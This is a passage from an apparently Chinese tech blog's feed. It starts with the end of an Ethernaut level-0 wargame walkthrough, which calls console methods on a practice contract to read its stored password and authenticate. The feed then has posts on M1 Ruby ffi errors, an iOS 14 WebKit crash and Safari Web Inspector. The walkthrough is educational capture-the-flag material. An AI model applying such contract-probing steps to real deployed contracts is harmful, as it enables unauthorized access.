class="attr">words</span>: [<span class="number">42</span>, empty], <span class="attr">length</span>: <span class="number">1</span>, <span class="attr">red</span>: <span class="literal">null</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; <span class="keyword">await</span> contract.<span class="title function_">info42</span>()</span><br><span class="line">&lt; <span class="string">&quot;theMethodName is the name of the next method.&quot;</span></span><br><span class="line"></span><br><span class="line">&gt; <span class="keyword">await</span> contract.<span class="title function_">theMethodName</span>()</span><br><span class="line">&lt; <span class="string">&quot;The method name is method7123949.&quot;</span></span><br><span class="line"></span><br><span class="line">&gt; <span class="keyword">await</span> contract.<span class="title function_">method7123949</span>()</span><br><span class="line">&lt; <span class="string">&quot;If you know the password, submit it to authenticate().&quot;</span></span><br><span class="line"></span><br><span class="line">&gt; <span class="keyword">await</span> contract.<span class="title function_">password</span>()</span><br><span class="line">&lt; <span class="string">&quot;ethernaut0&quot;</span></span><br><span class="line"></span><br><span class="line">&gt; <span class="keyword">await</span> contract.<span class="title function_">authenticate</span>(<span class="string">&quot;ethernaut0&quot;</span>)</span><br></pre></td></tr></table></figure><p>最后会弹出一个 MetaMask 的交易请求，确认后再按 Submit instance，再确认后 Console 会弹出 “You have completed this level!!!” 即本关完成。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Difficulty&lt;/strong&gt;: 0&amp;#x2F;10&lt;br&gt;&lt;strong&gt;Level&lt;/strong&gt;: &lt;a href=&quot;https://ethernaut.openzeppelin.com/level/0x4E73b858fD5D7A5fc1c</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>The Ethernaut 解析</title>
    <link href="https://chaosky.tech/2022/04/29/The-Ethernaut/"/>
    <id>https://chaosky.tech/2022/04/29/The-Ethernaut/</id>
    <published>2022-04-29T17:09:04.000Z</published>
    <updated>2022-11-03T16:37:09.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://ethernaut.openzeppelin.com/">Ethernaut</a> 是一个基于 Web3&#x2F;Solidity 的对抗游戏，每一关都有一个带有安全问题的智能合约供玩家去模拟攻击。 </p><p>游戏要求玩家具备 JavaScript、MetaMask和Solidity 智能合约相关知识，所有合约均为开源，玩家可以浏览 <a href="https://ethernaut.openzeppelin.com/">Ethernaut 网站</a> 在 Rinkeby 测试网络中游玩。或者到 <a href="https://github.com/OpenZeppelin/ethernaut">Github</a> 下载源代码。</p><h3 id="相关知识储备"><a href="#相关知识储备" class="headerlink" title="相关知识储备"></a>相关知识储备</h3><ol><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript">JavaScript</a></li><li><a href="https://developer.chrome.com/docs/devtools/">Chrome DevTools</a></li><li><a href="https://metamask.io/">MetaMask</a></li><li><a href="https://ethereum.org/zh/what-is-ethereum/">Ethereum</a></li><li><a href="https://ethereum.org/zh/developers/">Ethereum Developer</a></li></ol><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ol><li><a href="https://michael-blau.gitbook.io/x0r-resources/rinkeby-test-network/rinkeby-test-ether">Get Rinkeby Test ETH</a></li></ol><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><ul><li><a href="/2022/04/29/0-Hello-Ethernaut/">0. Hello Ethernaut</a></li><li><a href="/2022/05/19/1-Fallback/">1. Fallback</a></li><li><a href="/2022/07/11/2-Fallout/">2. Fallout</a></li><li><a href="/2022/07/11/3-Coin-Flip/">3. Coin Flip</a></li><li><a href="/2022/10/11/4-Telephone/">4. Telephone</a></li><li><a href="/2022/10/26/5-Token">5. Token</a></li><li><a href="/2022/11/01/6-Delegation">6. Delegation</a></li><li><a href="/2022/11/03/7-Force">7. Force</a></li><li><a href="/2022/11/03/8-Vault">8. Vault</a></li><li><a href="/2022/11/13/9-King">9. King</a></li><li><a href="/2022/11/22/10-Re-entrancy">10. Re-entrancy</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://ethernaut.openzeppelin.com/&quot;&gt;Ethernaut&lt;/a&gt; 是一个基于 Web3&amp;#x2F;Solidity 的对抗游戏，每一关都有一个带有安全问题的智能合约供玩家去模拟攻击。 &lt;/p&gt;
&lt;p&gt;游戏要求玩家具备 J</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>missing compatible arch in ffi_c.bundle on M1 with system Ruby</title>
    <link href="https://chaosky.tech/2021/06/17/missing-arch-in-ffi/"/>
    <id>https://chaosky.tech/2021/06/17/missing-arch-in-ffi/</id>
    <published>2021-06-17T18:24:06.000Z</published>
    <updated>2021-06-17T18:24:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>解决 Apple Silicon (M1) 上 <code>LoadError - dlsym(0x7fbb17932d30, Init_ffi_c): symbol not found - /Library/Ruby/Gems/2.6.0/gems/ffi-1.15.3/lib/ffi_c.bundle</code> 问题。</p><p>首先通过 <code>file /Library/Ruby/Gems/2.6.0/gems/ffi-1.15.3/lib/ffi_c.bundle</code> 查看这个文件的架构：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/Library/</span>Ruby<span class="regexp">/Gems/</span><span class="number">2.6</span>.<span class="number">0</span><span class="regexp">/gems/</span>ffi-<span class="number">1.15</span>.<span class="number">3</span><span class="regexp">/lib/</span>ffi_c.bundle: Mach-O universal binary with <span class="number">2</span> architectures: [x86_64:Mach-O <span class="number">64</span>-bit bundle x86_64] [arm64e:Mach-O <span class="number">64</span>-bit bundle arm64e]</span><br><span class="line"><span class="regexp">/Library/</span>Ruby<span class="regexp">/Gems/</span><span class="number">2.6</span>.<span class="number">0</span><span class="regexp">/gems/</span>ffi-<span class="number">1.15</span>.<span class="number">3</span><span class="regexp">/lib/</span>ffi_c.bundle (<span class="keyword">for</span> architecture x86_64):Mach-O <span class="number">64</span>-bit bundle x86_64</span><br><span class="line"><span class="regexp">/Library/</span>Ruby<span class="regexp">/Gems/</span><span class="number">2.6</span>.<span class="number">0</span><span class="regexp">/gems/</span>ffi-<span class="number">1.15</span>.<span class="number">3</span><span class="regexp">/lib/</span>ffi_c.bundle (<span class="keyword">for</span> architecture arm64e):Mach-O <span class="number">64</span>-bit bundle arm64e</span><br></pre></td></tr></table></figure><p>上面的信息有x86_64和arm64e，虽然包含了arm64e，但是此arm64e不是M1 对应的arm64。也就是说架构是不对的。</p><p>那我们接着往下看，先查询下系统ruby的版本 <code>ruby --version</code>。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ruby</span> <span class="number">2</span>.<span class="number">6</span>.<span class="number">3</span>p62 (<span class="number">2019</span>-<span class="number">04</span>-<span class="number">16</span> revision <span class="number">67580</span>)<span class="meta"> [universal.arm64e-darwin20]</span></span><br></pre></td></tr></table></figure><p>版本和时间都有，2019-04-16 的版本，但是 M1 是 2020 年出来的，不一定适配了新的架构。</p><p>那我们就必须得确认当前ruby的真实架构。我们可以通过一段代码获取 <code>arch.rb</code>：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rbconfig&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">OSVERSION</span> = <span class="title class_">RbConfig</span><span class="symbol">:</span><span class="symbol">:CONFIG</span>[<span class="string">&#x27;host_os&#x27;</span>]</span><br><span class="line"><span class="variable constant_">CPU</span> = <span class="title class_">RbConfig</span><span class="symbol">:</span><span class="symbol">:CONFIG</span>[<span class="string">&#x27;host_cpu&#x27;</span>]</span><br><span class="line"><span class="variable constant_">ARCH</span> = <span class="title class_">RbConfig</span><span class="symbol">:</span><span class="symbol">:CONFIG</span>[<span class="string">&#x27;arch&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts <span class="string">&quot;OS: <span class="subst">#&#123;<span class="variable constant_">OSVERSION</span>&#125;</span>&quot;</span></span><br><span class="line">puts <span class="string">&quot;CPU: <span class="subst">#&#123;<span class="variable constant_">CPU</span>&#125;</span>&quot;</span></span><br><span class="line">puts <span class="string">&quot;Arch: <span class="subst">#&#123;<span class="variable constant_">ARCH</span>&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><p>执行 <code>ruby arch.rb</code>：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">OS:</span> darwin20</span><br><span class="line"><span class="symbol">CPU:</span> x86_64</span><br><span class="line"><span class="symbol">Arch:</span> universal-darwin20</span><br></pre></td></tr></table></figure><p>诡异的一幕出现了，CPU架构却是x86_64而不是arm64，也就是说造成ffi无法运行的原因是ruby版本不支持 arm64。</p><p>问题找到了那接下来这个问题就好解决了，安装最新的ruby版本。</p><p>可以通过 <code>brew install ruby</code>，也可以通过 rbenv 或者 rvm 来安装。</p><p>我使用 <code>brew install ruby</code> 来安装最新的版本。</p><p>通过 brew 安装的 ruby 并不会生效，需要添加到环境变量中 <code>echo &#39;export PATH=&quot;/opt/homebrew/opt/ruby/bin:$PATH&quot;&#39; &gt;&gt; ~/.zshrc</code>。</p><p>为了验证是否有效我们先测试下新版本的架构，先设置当前shell的环境变量 <code>export PATH=&quot;/opt/homebrew/opt/ruby/bin:$PATH&quot;</code>。</p><p>执行 <code>ruby --version</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ruby</span> <span class="number">3</span>.<span class="number">0</span>.<span class="number">1</span>p64 (<span class="number">2021</span>-<span class="number">04</span>-<span class="number">05</span> revision <span class="number">0</span>fb782ee38)<span class="meta"> [arm64-darwin20]</span></span><br></pre></td></tr></table></figure><p>执行 <code>ruby arch.rb</code>：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">OS:</span> darwin20</span><br><span class="line"><span class="symbol">CPU:</span> arm64</span><br><span class="line"><span class="symbol">Arch:</span> arm64-darwin20</span><br></pre></td></tr></table></figure><p>CPU 架构正确，继续安装 CocoaPods <code>gem install cocoapods</code>。</p><p>成功！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;解决 Apple Silicon (M1) 上 &lt;code&gt;LoadError - dlsym(0x7fbb17932d30, Init_ffi_c): symbol not found - /Library/Ruby/Gems/2.6.0/gems/ffi-1.15.3/</summary>
      
    
    
    
    <category term="iOS" scheme="https://chaosky.tech/categories/iOS/"/>
    
    
    <category term="CocoaPods" scheme="https://chaosky.tech/tags/CocoaPods/"/>
    
    <category term="ruby" scheme="https://chaosky.tech/tags/ruby/"/>
    
  </entry>
  
  <entry>
    <title>WebKit的iOS 14 适配问题</title>
    <link href="https://chaosky.tech/2021/05/16/WebKit-iOS-14-adaptation-issues/"/>
    <id>https://chaosky.tech/2021/05/16/WebKit-iOS-14-adaptation-issues/</id>
    <published>2021-05-16T22:20:24.000Z</published>
    <updated>2021-05-16T22:20:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近在做 iOS 14 的 WebKit API 适配遇到一些问题记录下。</p><h3 id="Fatal-error-Bug-in-WebKit-Received-neither-result-or-failure-file-WebKit-WebKitSwiftOverlay-swift-line-66"><a href="#Fatal-error-Bug-in-WebKit-Received-neither-result-or-failure-file-WebKit-WebKitSwiftOverlay-swift-line-66" class="headerlink" title="Fatal error: Bug in WebKit: Received neither result or failure.: file WebKit&#x2F;WebKitSwiftOverlay.swift, line 66"></a>Fatal error: Bug in WebKit: Received neither result or failure.: file WebKit&#x2F;WebKitSwiftOverlay.swift, line 66</h3><h4 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webView.evaluateJavaScript(<span class="string">&quot;console.log(&#x27;Hello World&#x27;)&quot;</span>, in: <span class="literal">nil</span>, in: .page) &#123; result <span class="keyword">in</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 iOS 14.0 的版本中执行以上的代码会产生crash  <code>Fatal error: Bug in WebKit: Received neither result or failure.: file WebKit/WebKitSwiftOverlay.swift, line 66</code> ，但是在最新版 14.5 不会崩溃。</p><h4 id="定位问题"><a href="#定位问题" class="headerlink" title="定位问题"></a>定位问题</h4><p>在 WebKit 官方代码<a href="https://github.com/WebKit/WebKit/blob/debe8769281c735813e0e731a926773642d921e0/Source/WebKit/UIProcess/API/Cocoa/WebKitSwiftOverlay.swift#L66">WebKit&#x2F;WebKit</a> 中找到了这段产生crash的代码。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">func</span> <span class="title function_">makeResultHandler</span>&lt;<span class="type">Success</span>, <span class="type">Failure</span>&gt;(<span class="keyword">_</span> <span class="params">handler</span>: <span class="keyword">@escaping</span> (<span class="type">Result</span>&lt;<span class="type">Success</span>, <span class="type">Failure</span>&gt;) -&gt; <span class="type">Void</span>) -&gt; (<span class="type">Success</span>?, <span class="type">Failure</span>?) -&gt; <span class="type">Void</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; success, failure <span class="keyword">in</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> success <span class="operator">=</span> success &#123;</span><br><span class="line">            handler(.success(success))</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="keyword">let</span> failure <span class="operator">=</span> failure &#123;</span><br><span class="line">            handler(.failure(failure))</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">fatalError</span>(<span class="string">&quot;Bug in WebKit: Received neither result or failure.&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看源码可知，当 JavaScript 执行没有返回值，也没有错误的时候就会产生fatalError，比如执行<code>console.log(&#39;Hello World&#39;)</code>。</p><p>但是在 WebKit 的 main 分支最新代码中已经没有这段代码了，取而代之的是使用 <code>ObjCBlockConversion.boxingNilAsAnyForCompatibility</code>。</p><p>为了找到是在哪次commit中修复了这个问题，通过查询<code>WebKitSwiftOverlay.swift</code>文件的git修改记录，找到有这么一次commit，里面记录了这个crash修复的过程，有兴趣的可以去看看。</p><p><a href="https://github.com/WebKit/WebKit/commit/534def4b8414c5ca1bf3712272ad24eaf271b134#diff-93ac6a04946f8372bfaec900fdcab57ef95932e9f30f45e7115a9ea807b82e6c">https://github.com/WebKit/WebKit/commit/534def4b8414c5ca1bf3712272ad24eaf271b134#diff-93ac6a04946f8372bfaec900fdcab57ef95932e9f30f45e7115a9ea807b82e6c</a></p><p>问题已经找到，那就需要确定是在哪个版本的 iOS 中修复了这个问题。</p><p>首先需要找到 iOS 版本对应的 WebKit 版本。</p><p>在 Wikipedia 上有维护 <a href="https://en.wikipedia.org/wiki/Safari_version_history">Safari version history</a> Safiri 版本和对应的 WebKit 版本，但是遗憾的是最新版本的 iOS 14 还没有该记录。</p><p>那接下来如何找到 WebKit 版本呢？</p><p>需要分为两部分，首先先确定Xcode里集成的 iOS 编译库，再确定老版本的 iOS，老版本的iOS可以从Xcode 的 Components 下载对应版本的Simulator。</p><p>以 Xcode 12.5 为例。在 <code>/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Library/Developer/CoreSimulator/Profiles/Runtimes/</code> 路径下找到 <code>iOS.simruntime</code>，再找到 WebKit <code>Contents/Resources/RuntimeRoot/System/Library/Frameworks/WebKit.framework/WebKit</code>。</p><p>完整路径为：<code>/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Library/Developer/CoreSimulator/Profiles/Runtimes/iOS.simruntime/Contents/Resources/RuntimeRoot/System/Library/Frameworks/WebKit.framework</code>。</p><p>通过 <code>otool -L</code> 命令找到对应的WebKit 版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">otool -L WebKit | grep WebKit                                      [23:42:54]</span></span><br><span class="line">WebKit:</span><br><span class="line">/System/Library/Frameworks/WebKit.framework/WebKit (compatibility version 1.0.0, current version 611.1.21)</span><br><span class="line">/System/Library/PrivateFrameworks/WebKitLegacy.framework/WebKitLegacy (compatibility version 1.0.0, current version 611.1.21, reexport)</span><br></pre></td></tr></table></figure><p>其中 611.1.21 就是对应的 WebKit 的版本。</p><p>Xcode 通过 Components 下载的 Simulator 版本路径在 <code>/Library/Developer/CoreSimulator/Profiles/Runtimes</code> 下，用同样的方式确定 iOS 版本的 WebKit 版本。</p><table><thead><tr><th>iOS 版本</th><th>WebKit 版本</th></tr></thead><tbody><tr><td>iOS 14.5</td><td>611.1.21</td></tr><tr><td>iOS 14.4</td><td>610.4.3</td></tr><tr><td>iOS 14.3</td><td>610.3.7</td></tr><tr><td>iOS 14.2</td><td>610.2.11</td></tr></tbody></table><p>最后在 <a href="https://github.com/WebKit/WebKit/blob/safari-610.2.11.0-branch/Source/WebKit/UIProcess/API/Cocoa/WebKitSwiftOverlay.swift">WebKit&#x2F;Webkit</a> 上确认对应的修复版本，最终确认修复的版本为 iOS 14.3。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>对 <code>evaluateJavaScript</code> 方法做兼容，不能直接使用 <code>#available(iOS 14.0, *)</code> 适配。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">#available</span>(<span class="keyword">iOS</span> <span class="number">14.3</span>, <span class="operator">*</span>) &#123;</span><br><span class="line">    webView.evaluateJavaScript(<span class="string">&quot;console.log(&#x27;Hello World&#x27;)&quot;</span>, in: <span class="literal">nil</span>, in: .page) &#123; result <span class="keyword">in</span></span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    webView.evaluateJavaScript(<span class="string">&quot;console.log(&#x27;Hello World&#x27;)&quot;</span>) &#123; value, error <span class="keyword">in</span></span><br><span class="line">        <span class="built_in">print</span>(value)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近在做 iOS 14 的 WebKit API 适配遇到一些问题记录下。&lt;/p&gt;
&lt;h3 id=&quot;Fatal-error-Bug-in-WebKit-Received-neither-result-or-failure-file-WebKit-WebKitSwiftOve</summary>
      
    
    
    
    <category term="iOS" scheme="https://chaosky.tech/categories/iOS/"/>
    
    
    <category term="WebKit" scheme="https://chaosky.tech/tags/WebKit/"/>
    
    <category term="WebView" scheme="https://chaosky.tech/tags/WebView/"/>
    
  </entry>
  
  <entry>
    <title>在 Mac 上使用 Safari 调试 iOS WebView</title>
    <link href="https://chaosky.tech/2020/09/08/Safari-Web-Inspector-For-iOS-WebView/"/>
    <id>https://chaosky.tech/2020/09/08/Safari-Web-Inspector-For-iOS-WebView/</id>
    <published>2020-09-08T15:36:14.000Z</published>
    <updated>2020-09-08T15:36:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="Mac-OS"><a href="#Mac-OS" class="headerlink" title="Mac OS"></a>Mac OS</h3><h4 id="Safari-开启调试模式"><a href="#Safari-开启调试模式" class="headerlink" title="Safari 开启调试模式"></a>Safari 开启调试模式</h4><p>依次选择 <strong>偏好设置 &gt; 高级 &gt; 在菜单栏中显示“开发”菜单</strong>。</p><img src="1599551644-image-20200908154443157.png" alt="image-20200908154443157" style="zoom: 33%;" /><h3 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h3><h4 id="Safari-开启调试模式-1"><a href="#Safari-开启调试模式-1" class="headerlink" title="Safari 开启调试模式"></a>Safari 开启调试模式</h4><p>要远程调试 iOS Safari ，必须启用 Web 检查 功能，打开 iPhone 依次进入 <strong>设置 &gt; Safari &gt; 高级 &gt; Web 检查 &gt; 启用</strong>。</p><img src="1599551655-IMG_19800580398B-1.jpeg" alt="IMG_19800580398B-1" style="zoom: 33%;" /><h2 id="开发调试"><a href="#开发调试" class="headerlink" title="开发调试"></a>开发调试</h2><h3 id="启动-Web-Inspector"><a href="#启动-Web-Inspector" class="headerlink" title="启动 Web Inspector"></a>启动 Web Inspector</h3><ol><li>iPhone 使用 Safari 浏览器打开要调试的页面，或者 App 里打开要调试的页面</li><li>Mac 打开 Safari 浏览器调试（菜单栏 &gt; 开发 &gt; iPhone 设备名 -&gt; 选择调试页面）</li><li>在弹出的 Safari Developer Tools 中调试</li></ol><h3 id="调试菜单"><a href="#调试菜单" class="headerlink" title="调试菜单"></a>调试菜单</h3><p><img src="/2020/09/08/Safari-Web-Inspector-For-iOS-WebView/1599553103-640.jpeg" alt="img"></p><h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h4><p>这个菜单用来显示当前网页中加载的资源，比如 HTML、JS、CSS、图片、字体等资源文件，并且可以对 JS 代码添加断点来调试代码。</p><h5 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h5><p>Inspector 中的断点调试和 Xocde 的大同小异。</p><h5 id="格式化代码"><a href="#格式化代码" class="headerlink" title="格式化代码"></a>格式化代码</h5><p>web 页面中的 JS、CSS、HTML 文件大多数都经过了压缩处理，以前 inspector 并不支持 HTML，这次可以格式化 HTML 文件了：<br><img src="/2020/09/08/Safari-Web-Inspector-For-iOS-WebView/1599553124-640-20200908161844693.jpeg" alt="img"></p><h5 id="Local-overrides"><a href="#Local-overrides" class="headerlink" title="Local overrides"></a>Local overrides</h5><p>如果你想调试某个文件的时候，通常把改动好的代码推动服务端，然后通过浏览器访问，查看效果，整个过程可能会耗费很长时间。Local overrides 提供了一种能力，可以替换当前页面所加载的文件，这样只需要修改本地文件即可，当页面加载的时候会直接使用本地的文件，达到快速调试的作用。更多内容。<br><img src="/2020/09/08/Safari-Web-Inspector-For-iOS-WebView/1599553134-640.png" alt="img"></p><h5 id="Bootstrap-Script"><a href="#Bootstrap-Script" class="headerlink" title="Bootstrap Script"></a>Bootstrap Script</h5><p>Bootstrap Script 也叫引导程序，通常是程序执行时第一个要执行的文件，在 Inspector 中可以创建一个这样的文件用来作为调试工具使用，比如替换某个函数的实现，给某个函数增加特殊的调试语句。在调试的时候，很多 JS 函数都经过了压缩处理，可通过这种方式把压缩的函数替换成未被压缩的函数，方便调试。<br>更多内容</p><h4 id="Timelines"><a href="#Timelines" class="headerlink" title="Timelines"></a>Timelines</h4><p>Timelines 用来分享各种功能的加载时长。</p><h4 id="Sotrage"><a href="#Sotrage" class="headerlink" title="Sotrage"></a>Sotrage</h4><p>storage 用来显示缓存的数据，比如 Local Storage、Session Storage、Indexed DataBase。</p><h4 id="Layers"><a href="#Layers" class="headerlink" title="Layers"></a>Layers</h4><p>Layers 主要用来显示页面的绘制、布局。<br><img src="/2020/09/08/Safari-Web-Inspector-For-iOS-WebView/1599553147-640-20200908161907264.jpeg" alt="img"></p><h4 id="Console"><a href="#Console" class="headerlink" title="Console"></a>Console</h4><p>console 就是打印日志的地方，也可以执行 JavaScript 代码。Console 的界面如下：</p><p><img src="/2020/09/08/Safari-Web-Inspector-For-iOS-WebView/1599553155-640-20200908161914993.jpeg" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h2&gt;&lt;h3 id=&quot;Mac-OS&quot;&gt;&lt;a href=&quot;#Mac-OS&quot; class=&quot;headerlink&quot; title=&quot;Mac O</summary>
      
    
    
    
    <category term="iOS" scheme="https://chaosky.tech/categories/iOS/"/>
    
    
    <category term="Tips" scheme="https://chaosky.tech/tags/Tips/"/>
    
    <category term="WebView" scheme="https://chaosky.tech/tags/WebView/"/>
    
    <category term="Inspector" scheme="https://chaosky.tech/tags/Inspector/"/>
    
  </entry>
  
</feed>
